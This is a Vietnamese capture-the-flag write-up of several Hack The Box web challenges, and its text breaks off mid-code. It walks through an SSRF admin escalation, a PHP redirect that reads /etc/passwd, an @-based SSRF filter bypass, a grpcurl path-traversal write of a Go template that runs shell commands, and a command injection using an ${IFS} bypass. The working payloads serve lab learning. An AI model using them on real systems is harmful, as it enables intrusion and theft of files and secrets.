---
title: "Htb web chall ctf 2024 - solved challenges - part 2"
excerpt: "August 21, 2024 08:00 AM ICT to August 21, 2024 04:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb.jpg">
</p>

# Hack the box

## HauntMart

- Tiếp tục chall với cấu trúc y hệt như mấy chall python_flask trước:

```
from flask import Flask
from application.blueprints.routes import web, api
from application.database import mysql
from application.util import response

app = Flask(__name__)
app.config.from_object('application.config.Config')

mysql.init_app(app)

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, 'description') else [str(x) for x in error.args]
    response = {
        'error': {
            'type': error.__class__.__name__,
            'message': message
        }
    }

    return response, error.code if hasattr(error, 'code') else 500
```

- Quan sát luôn các route nhé:

```
from application.database import *
from flask import Blueprint, redirect, render_template, request, session, current_app
from application.util import response, isAuthenticated, generateToken, isFromLocalhost, downloadManual
import sys

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/', methods=['GET'])
def loginView():
    return render_template('login.html')

@web.route('/register', methods=['GET'])
def registerView():
    return render_template('register.html')

@web.route('/home', methods=['GET'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user, flag=current_app.config['FLAG'])

@web.route('/product', methods=['GET'])
@isAuthenticated
def productView(user):
    return render_template('product.html', user=user)

@web.route('/logout')
def logout():
    session['token'] = None
    return redirect('/')

@api.route('/login', methods=['POST'])
def api_login():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = loginUserDb(username, password)
    
    if user:
        token = generateToken(user.get('username'), user.get('role'))
        session['token'] = token
        return response('Success'), 200
        
    return response('Invalid credentials!'), 403

@api.route('/register', methods=['POST'])
def api_register():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')
    
    if not username or not password:
        return response('All fields are required!'), 401
    
    user = registerUserDb(username, password, 'user')
    
    if user:
        return response('User registered! Please login'), 200
        
    return response('User already exists!'), 403

@api.route('/product', methods=['POST'])
@isAuthenticated
def sellProduct(user):
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()
    name = data.get('name', '')
    price = data.get('price', '')
    description = data.get('description', '')
    manualUrl = data.get('manual', '')

    if not name or not price or not description or not manualUrl:
        return response('All fields are required!'), 401

    manualPath = downloadManual(manualUrl)
    if (manualPath):
        addProduct(name, description, price)
        return response('Product submitted! Our mods will review your request')
    return response('Invalid Manual URL!'), 400


@api.route('/addAdmin', methods=['GET'])
@isFromLocalhost
def addAdmin():
    username = request.args.get('username')
    
    if not username:
        return response('Invalid username'), 400
    
    result = makeUserAdmin(username)

    if result:
        return response('User updated!')
    return response('Invalid username'), 400
```

- Vị trí của flag nằm ở `/flag.txt`.
- Ta có thể thấy trong route.py -> route /home:

```
@web.route('/home', methods=['GET'])
@isAuthenticated
def homeView(user):
    return render_template('index.html', user=user, flag=current_app.config['FLAG'])
```
- Nếu role của người dùng là admin thì sẽ hiển thị flag cho chúng ta:

```
{% if user['role'] == 'admin' %}
 {{flag}}
{% endif %}
```

- giờ thì tìm nơi liên quan đến nó -> có thể thấy ở đây có một api đển addAdmin nhưng mà nó phải là localhost mới được truy cập:

```
@api.route('/addAdmin', methods=['GET'])
@isFromLocalhost
def addAdmin():
    username = request.args.get('username')
    
    if not username:
        return response('Invalid username'), 400
    
    result = makeUserAdmin(username)

    if result:
        return response('User updated!')
    return response('Invalid username'), 400
```

```
def isFromLocalhost(func):
    @wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != "127.0.0.1":
            return abort(403)
        return func(*args, **kwargs)

    return check_ip
```

- Trông có vẻ như chưa có bypass được ở đây -> quan sát các route còn lại ngoài chức năng đăng nhập và đăng kí thì chỉ còn 1 api này:


```
@api.route('/product', methods=['POST'])
@isAuthenticated
def sellProduct(user):
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()
    name = data.get('name', '')
    price = data.get('price', '')
    description = data.get('description', '')
    manualUrl = data.get('manual', '')

    if not name or not price or not description or not manualUrl:
        return response('All fields are required!'), 401

    manualPath = downloadManual(manualUrl)
    if (manualPath):
        addProduct(name, description, price)
        return response('Product submitted! Our mods will review your request')
    return response('Invalid Manual URL!'), 400

```

- Chỉ cần authen người dùng bình thường lấy name, price, description, manual sau đó gọi hàm `downloadManual` với url được truyền vào -> nếu có thì addProduct và trả về.

```
def downloadManual(url):
    safeUrl = isSafeUrl(url)
    if safeUrl:
        try:
            local_filename = url.split("/")[-1]
            r = requests.get(url)
            
            with open(f"/opt/manualFiles/{local_filename}", "wb") as f:
                for chunk in r.iter_content(chunk_size=1024):
                    if chunk:
                        f.write(chunk)
            return True
        except:
            return False
    
    return False
```

- Hàm này sẽ thực hiện check url với hàm:

```
blocked_host = ["127.0.0.1", "localhost", "0.0.0.0"]
def isSafeUrl(url):
    for hosts in blocked_host:
        if hosts in url:
            return False
    
    return True

```

- ip của ta phải khác với các ip trong mảng thì vượt qua -> sau đó nó `r = requests.get(url)`
- Không cần để ý phần sau nữa vì ta sẽ lợi dụng cái này để truyền url gọi đến addAdmin để cấp quyền admin cho user mà mình đăng nhập.

### exploit

![image](https://hackmd.io/_uploads/ByvRMsqI0.png)

![image](https://hackmd.io/_uploads/rywlVscI0.png)

![image](https://hackmd.io/_uploads/H1ErKs58A.png)


flag : `HTB{s5rf_m4d3_m3_w3t_my_p4nts!}`


## PDFy

![image](https://hackmd.io/_uploads/rkNTmn980.png)

![image](https://hackmd.io/_uploads/B1H57n5LA.png)
![image](https://hackmd.io/_uploads/BJFj73qIR.png)

```
┌──(l3mnt2010㉿ASUSEXPERTBOOK)-[~/PDFy]
└─$ cat index.php
<?php header('location:file:///etc/passwd'); ?>
```

flag : `HTB{pdF_g3n3r4t1on_g03s_brrr!}`
## ProxyAsAService

- Một chall với flask_python với các route sau:

```
from flask import Flask, jsonify
from application.blueprints.routes import proxy_api, debug

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(proxy_api, url_prefix='/')
app.register_blueprint(debug, url_prefix='/debug')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found'}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400
```

- Route / và /debug:

```
from flask import Blueprint, request, Response, jsonify, redirect, url_for
from application.util import is_from_localhost, proxy_req
import random, os

SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug     = Blueprint('debug', __name__)


@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]

        random_subreddit = random.choice(cat_meme_subreddits)

        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())

@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }

    return jsonify(environment_info)

```


- Như ta thấy ở đây có 2 route `/proxy_api/` và `/debug/environment`

- Như thường lệ ta sẽ check xem vị trí của flag:


```
/Dockerfile

FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache libcurl curl-dev build-base supervisor


# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask requests

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY challenge .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Place flag in environ
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]

```


- ở đây ta có thể thấy vị trí của flag nằm ở trong env -> vậy 1 là rce hoặc 2 là cách nào để đọc file env không.
- Và thấy ở đây là route /debug/enviroment trả ra nội dung ` environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }`

- Nhưng sẽ có một middlware check localhost:


```
def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

```

- Check_ip nó là 127.0.0.1 thì cho acccess.
- Vậy thì nơi để access nó chắc hẳn là route còn lại:

```

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]

        random_subreddit = random.choice(cat_meme_subreddits)

        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())
```

- Nó nhận get vả post với param url -> thiết lập `target_url = f'http://{SITE_NAME}{url}'` mặc định là host của reddit -> sau đó gửi request đến.
- Vậy làm sao để nó gọi đến /debug/environment -> chỉ cần nó gọi đến endpoint này là sẽ access được FLAG và hiển thị.

- Quan sát 1 chút về uri :

![image](https://hackmd.io/_uploads/BkhuQ7hUC.png)

- có thể thấy phần host sẽ luân đứng như hình và sau dấu @ vậy nếu ta thêm @ vào trước url param và sau đó là localhost thì lúc này nó nhận phần trước là user và info -> bypass được localhost.

- Chú ý black-list:


```

RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
def proxy_req(url):    
    method = request.method
    headers =  {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```

### Exploit
![image](https://hackmd.io/_uploads/Bk9MBX28C.png)


```
GET /?url=@0.0.0.0:1337/debug/environment HTTP/1.1
Host: 94.237.49.212:30902
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=1


```

flag: `HTB{fl4gs_4s_4_S3rv1c3}`


## Testimonial


- Một chall với golang chạy grpc để làm waf:

![image](https://hackmd.io/_uploads/S1DrbhiLR.png)

- Ta có thế thấy flow chính của trang nằm ở main.go:

```

package main

import (
	"embed"
	"htbchal/handler"
	"htbchal/pb"
	"log"
	"net"
	"net/http"

	"github.com/go-chi/chi/v5"
	"google.golang.org/grpc"
)

//go:embed public
var FS embed.FS

func main() {
	router := chi.NewMux()

	router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS))))
	router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))
	go startGRPC()
	log.Fatal(http.ListenAndServe(":1337", router))
}

type server struct {
	pb.RickyServiceServer
}

func startGRPC() error {
	lis, err := net.Listen("tcp", ":50045")
	if err != nil {
		log.Fatal(err)
	}
	s := grpc.NewServer()

	pb.RegisterRickyServiceServer(s, &server{})
	if err := s.Serve(lis); err != nil {
		log.Fatal(err)
	}
	return nil
}

```

- ở đây chúng ta có thể thấy có một route chúng đó là `router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))` và để ý thêm là server đang chạy ở cổng 1337 và start thêm một cổng 50045 với giao thức tcp để lắng nghe các sự kiện.

- Dưới đây là phần logic của HandlerHomeIndex:

```
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
	customer := r.URL.Query().Get("customer")
	testimonial := r.URL.Query().Get("testimonial")
	if customer != "" && testimonial != "" {
		c, err := client.GetClient()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}

		if err := c.SendTestimonial(customer, testimonial); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}
	}
	return home.Index().Render(r.Context(), w)
}

```

- Nhận 2 query đó là `customer` và `testimonial` nếu mà 1 trong 2 giá trị không tồn tại thì trả tra error.
- Sau đó khởi tạo connect đến localhost port tcp `c, err := client.GetClient()`:

```
func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}
```

- Tiếp tục gửi 2 query đến tcp server `c.SendTestimonial(customer, testimonial)`:

```
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```


- ở đây nó sẽ lặp qua mảng các string như trên để filter các lỗi xss hoặc ssti và các lỗi có nguy cơ xảy ra trong cú pháp của golang -> replace toàn bộ những kí tự gặp phải -> gọi phương thức `c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})` để gửi chúng.

- Cuối cùng sẽ hiển thị `return home.Index().Render(r.Context(), w)` chính là template `index.templ` để hiển thị các bản note đã ghi:


```

package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
<nav class="navbar navbar-expand-lg navbar-dark bg-black">
  <div class="container-fluid">
    <a class="navbar-brand" href="/">The Fray</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
            <li class="nav-item active">
                <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Factions</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Trials</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Contact</a>
            </li>
        </ul>
    </div>
  </div>
</nav>

<div class="container">
  <section class="jumbotron text-center">
      <div class="container mt-5">
          <h1 class="display-4">Welcome to The Fray</h1>
          <p class="lead">Assemble your faction and prove you're the last one standing!</p>
          <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
      </div>
  </section>

  <section class="container mt-5">
      <h2 class="text-center mb-4">What Others Say</h2>
      <div class="row">
          @Testimonials()
      </div>
  </section>


  <div class="row mt-5 mb-5">
    <div class="col-md">
      <h2 class="text-center mb-4">Submit Your Testimonial</h2>
      <form method="get" action="/">
        <div class="form-group">
          <label class="mt-2" for="testimonialText">Your Testimonial</label>
          <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
        </div>
        <div class="form-group">
          <label class="mt-2" for="testifierName">Your Name</label>
          <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
        </div>
        <button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
      </form>
    </div>
  </div>
</div>

<footer class="bg-black text-white text-center py-3">
    <p>&copy; 2024 The Fray. All Rights Reserved.</p>
</footer>
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
                <p class="text-muted">- Anonymous Testifier</p>
            </div>
        </div>
    </div>
  }
}
```

- Ta có thể thấy ở đây thì trang sẽ hiển thị các bản note theo định dạng string hết nên khó có thể xss hoặc ssti ở đây:

```
func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

```

- Cùng để ý vị trí của flag:


```

FROM golang:1.22-alpine3.18

WORKDIR /challenge/

COPY ./challenge/ /challenge/

COPY ./flag.txt /flag.txt

RUN go mod download -x \
 && go install github.com/cosmtrek/air@latest \
 && go install github.com/a-h/templ/cmd/templ@latest

EXPOSE 1337
EXPOSE 50045

COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

```

- Flag nằm tại root nên mục tiêu của ta là RCE được mà khả năng của SSTI với template này hầu như là không được. 
- Như mình đã phần tích thì bạn để ý việc filter do bạn gửi 2 query trên đến server và tcp này có vai trò như một proxy có nghĩa là nó chỉ filter trước khi chúng ta gửi đến nó -> vậy ta có thể kết nối trực tiếp đến tcp luôn không -> câu trả lời là có -> nếu ta gửi trực tiếp đến tcp port lúc này nó không bị filter các kí tự blacklist.

- vậy là ý tưởng để bypass blacklist đã có, vậy thì làm sao để RCE -> ta sẽ đi vào sâu vào luồng mà 2 giá trị ta truyền vào là gì.

- và nó ở đây:


```
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}

```

- ở đây thì sẽ gọi os viết file `os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial)` 
- Vậy do filter '.' nên chúng ta không thể triger path travesal để ghi đè file được.
- ở đây ta có thể dùng postman hoặc grpcurl của golang để gửi request trực tiếp đến grpc.


### RCE
- Đầu tiên ta dùng grpcurl để gửi request -> ghi đề file index.templ
- Sau đó ta triger code để đọc flag 

### Exploit

![image](https://hackmd.io/_uploads/SksPoTiIC.png)


![image](https://hackmd.io/_uploads/ByTui6jIC.png)


```

l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Có thể thấy ở đây đang có một service RickyService như ta thấy đó là chạy tcp với grpc.


- Ta sẽ xem mô tả của service này :

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Bây giờ ta sẽ gửi request đến nó:

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
RickyService.SubmitTestimonial
Failed to dial target host "94.237.59.63:31364": tls: first record does not look like a TLS handshake
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Nó đã hiển thị ở trong nội dung:

![image](https://hackmd.io/_uploads/HJhcppoI0.png)

- Vậy ta có thể trigger được rồi -> bây giờ thì ghi đè index.templ:


Nội dung:

```
package home

import (
    "os/exec"
    "strings"
)

func hack() []string {
    output, _ := exec.Command("ls", "/").CombinedOutput()
    lines := strings.Fields(string(output))
    return lines
}

templ Index() {
    @template(hack())
}

templ template(items []string) {
    for _, item := range items {
        {item}
    }
}
```

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
RickyService.SubmitTestimonial
Failed to dial target host "94.237.59.63:31364": tls: first record does not look like a TLS handshake
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"ls\", \"/\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
```

![image](https://hackmd.io/_uploads/rkVGJCs80.png)


```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"cat\", \"/flagd9d82e7fe1.txt\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
```


![image](https://hackmd.io/_uploads/HyywyAi8A.png)


flag: `HTB{w34kly_t35t3d_t3mplate5_n0t_s4f3_4t_411}`



## HTB Proxy

- Một chall với proxy golang do author tự config + backend chạy với nodejs.


- Ta sẽ đi từ backend đi ngược lại:

```
const ipWrapper = require("ip-wrapper");
const express = require("express");

const app = express();
app.use(express.json());

const validateInput = (req, res, next) => {
    const { interface } = req.body;

    if (
        !interface || 
        typeof interface !== "string" || 
        interface.trim() === "" || 
        interface.includes(" ")
    ) {
        return res.status(400).json({message: "A valid interface is required"});
    }

    next();
}

app.post("/getAddresses", async (req, res) => {
    try {
        const addr = await ipWrapper.addr.show();
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error getting addresses"});
    }
});

app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;

    try {
        const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error flushing interface"});
    }
});

app.listen(5000, () => {
    console.log("Network utils API is up on :5000");
});
```

- Source code đơn giản như này, có thể thấy có 2 route duy nhất đó là /getAddresses và /flushInterface.
- Đi vào xem source của `ip-wrapper` có thể thấy ở api `flushInterface` ở method flush sẽ gọi một command với exec của `child_process`:


```
function flush(interfaceName) {
    return new Promise((resolve, reject) => {
        exec(`ip address flush dev ${interfaceName}`, (error, stdout, stderr) => {
            if (stderr) {
                if(stderr.includes('Cannot find device')) {
                    reject(new Error('Cannot find device ' + interfaceName));
                } else {
                    reject(new Error('Error flushing IP addresses: ' + stderr));
                }
                return;
            }

            resolve();
        });
    });
}
```

Nó nhận interfaceName và nối chuỗi vào command -> ta có thể thực hiện command injection ở đây. Và `const { interface } = req.body;` có thể được control bởi đầu vào của người dùng -> RCE ở đây:


```
# Start from the base Alpine image
FROM alpine:3.19.1

# Install Golang, Node.js, and Supervisor
RUN apk add --no-cache \
    go \
    nodejs \
    npm \
    supervisor \
    && npm install -g npm@latest

# Copy flag
COPY flag.txt /flag.txt

# Set a working directory 
WORKDIR /app/proxy

COPY challenge /app

# Compile proxy
RUN go build -o htbproxy main.go

# Set workdir
WORKDIR /app/backend

# Install npm dependencies
RUN npm install

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 1337

# Create database and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

- Flag nằm ở root nên đây là hướng đi của chall này -> nhưng trước hết ta cần để ý là để access đến nó có một middleware:

```
const validateInput = (req, res, next) => {
    const { interface } = req.body;

    if (
        !interface || 
        typeof interface !== "string" || 
        interface.trim() === "" || 
        interface.includes(" ")
    ) {
        return res.status(400).json({message: "A valid interface is required"});
    }

    next();
}
```

- Check interface là chuỗi không chứa khoảng trắng hoặc nếu loại bỏ khoảng trắng nó rỗng -> đây là cách filter commannd injection -> ta có một cách bypass space là ${IFS}. Vậy là đã có cách để bypass commandi -> vấn đề tiếp theo là proxy golang.

### Go proxy


```
func main() {
	var serverPort string = "1337"
	var version string = "1.0.0"
	logHeader(version)

	ln, err := net.Listen("tcp", ":"+serverPort)
	if err != nil {
		prettyLog(2, "Error listening: "+err.Error())
		return
	}

	defer ln.Close()
	prettyLog(1, "HTB proxy listening on :"+serverPort)

	for {
		conn, err := ln.Accept()
		if err != nil {
			prettyLog(2, "Error accepting: "+err.Error())
			continue
		}

		go handleRequest(conn)
	}
}
```


- Ta có thể thấy ở đây là chương trình chạy tcp ở cổng 1337 và hanndler các request với :
```
go handleRequest(conn)
```

```
func handleRequest(frontendConn net.Conn) {
	buffer := make([]byte, 1024)

	length, err := frontendConn.Read(buffer)
	var remoteAddr string = frontendConn.RemoteAddr().String()

	prettyLog(1, "Connection from: "+remoteAddr)

	if err != nil {
		prettyLog(2, "Error reading: "+err.Error())
		frontendConn.Close()
		return
	}

	var requestBytes = buffer[:length]
	request, err := requestParser(requestBytes, remoteAddr)

	if err != nil {
		var responseText string = badReqResponse(err.Error())
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.Protocol != HTTPVersions.HTTP1_1 {
		var responseText string = notSupportedResponse("Protocol version not supported")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.URL == string([]byte{47}) {
		var responseText string = htmlResponse("/app/proxy/includes/index.html")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
		var serverInfo string = GetServerInfo()
		var responseText string = okResponse(serverInfo)
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
		var responseText string = badReqResponse("Not Allowed")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	host, hostExists := request.Headers["Host"]
	if !hostExists {
		var responseText string = badReqResponse("Host header not set")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	var hostArray []string = strings.Split(host, ":")
	if len(hostArray) != 2 || hostArray[1] == "" {
		var responseText string = badReqResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	var hostPort string = hostArray[1]
	inRange, err := isDigitInRange(hostPort, 1, 65535)
	if err != nil || !inRange {
		var responseText string = badReqResponse("Invalid port")
		frontendConn.Write([]byte(responseText))
